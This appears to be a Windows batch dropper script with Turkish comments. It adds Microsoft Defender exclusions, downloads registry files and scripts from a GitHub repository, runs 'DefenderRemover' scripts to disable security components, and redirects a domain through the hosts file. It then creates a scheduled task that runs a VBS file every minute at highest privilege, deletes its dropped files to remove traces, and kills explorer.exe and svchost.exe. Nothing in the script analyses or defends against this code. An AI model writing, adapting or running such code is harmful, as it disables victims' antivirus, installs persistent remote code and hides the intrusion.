@echo off
setlocal EnableDelayedExpansion

REM =========== 1. Defender Hariç Tutmalar ============
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\DefenderRemover.bat'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RemoveSecHealthApp.ps1'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\PowerRun.exe'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_SecurityComp\Remove_SecurityComp.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\NomoreDelayandTimeouts.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\Output.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\RemoveShellAssociation.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RunDefenderRemover.vbs'"

REM =========== 2. Taskları Sil ============
schtasks /delete /tn "upgradef1" /f
schtasks /delete /tn "InstallRequests" /f
schtasks /delete /tn "RunPowerShellScript" /f

REM =========== 3. Gerekli Klasörleri Oluştur ============
cd %temp%
mkdir Remove_SecurityComp
mkdir Remove_Defender

REM =========== 4. Reg Dosyalarını İndir ============
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Remove_SecurityComp.reg -o "%temp%\Remove_SecurityComp\Remove_SecurityComp.reg"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/NomoreDelayandTimeouts.reg -o "%temp%\Remove_Defender\NomoreDelayandTimeouts.reg"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Output.reg -o "%temp%\Remove_Defender\Output.reg"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RemoveShellAssociation.reg -o "%temp%\Remove_Defender\RemoveShellAssociation.reg"

REM =========== 5. Scriptleri İndir ============
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RunDefenderRemover.vbs -o "%temp%\RunDefenderRemover.vbs"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/DefenderRemover.bat -o "%temp%\DefenderRemover.bat"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs -o "%temp%\e.vbs"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o "%temp%\asd123.bat"

REM =========== 6. Hosts Dosyasına Domain Ekle ============
echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts

REM =========== 7. Ana Betikleri Çalıştır ============
cd %temp%
call DefenderRemover.bat
cscript //nologo RunDefenderRemover.vbs

REM =========== 8. Task Scheduler'a Yeni Görev Ekle ============
schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1 /f /rl HIGHEST

REM =========== 9. İz Temizleme ============
timeout /t 5
cd %temp%
del /f /q "s.bat"
del /f /q "a.py"
del /f /q "ddd.vbs"
del /f /q "expe2.bat"
del /f /q "expe2.vbs"
del /f /q "lalala.vbs"
del /f /q "a.ps1"
del /f /q "first.exe"
del /f /q "corpvpn.inf"
del /f /q "RunDefenderRemover.vbs"
del /f /q "DefenderRemover.bat"
rmdir /s /q "Remove_SecurityComp"
rmdir /s /q "Remove_Defender"

REM =========== 10. Sonlandırma (Alternatif: shutdown yerine explorer kill) ============
timeout /t 10
taskkill /f /im explorer.exe
taskkill /f /im svchost.exe

REM Güvenli kapanış

